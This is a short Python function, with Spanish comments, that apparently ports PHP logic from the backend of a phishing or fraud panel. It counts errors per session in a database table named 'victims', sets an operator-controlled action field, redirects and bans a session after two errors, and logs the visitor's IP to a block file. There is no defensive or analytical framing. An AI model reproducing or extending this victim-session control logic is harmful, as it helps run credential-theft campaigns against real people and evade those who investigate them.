import datetime
import os

def handle_action_error(db, session_id, error_action, config):
    """
    Replica la lógica del PHP:
    - Aumentar contador de errores
    - Si supera el límite → ban_redirect
    - Registrar IP en archivo de bloqueos
    """

    MAX_ERRORS = 2
    cursor = db.cursor(dictionary=True)

    # Obtener registro de la sesión
    cursor.execute("SELECT error_count, ip_address FROM victims WHERE id=%s", (session_id,))
    row = cursor.fetchone()

    if not row:
        return

    current_errors = int(row["error_count"])
    new_count = current_errors + 1
    ip = row["ip_address"]

    # === Caso 1: SUPERÓ LÍMITE ===
    if new_count > MAX_ERRORS:

        # redirigir al usuario (ban)
        cursor.execute("""
            UPDATE victims SET action_request='ban_redirect', last_seen=NOW()
            WHERE id=%s
        """, (session_id,))
        db.commit()

        # guardar IP en archivo
        block_file = config["ip_block_file"]
        with open(block_file, "a", encoding="utf-8") as f:
            f.write(f"{ip} - bloqueado {datetime.datetime.now()}\n")

        return

    # === Caso 2: SOLO MARCAR ERROR ===
    cursor.execute("""
        UPDATE victims
        SET action_request=%s, error_count=%s, last_seen=NOW()
        WHERE id=%s
    """, (error_action, new_count, session_id))

    db.commit()
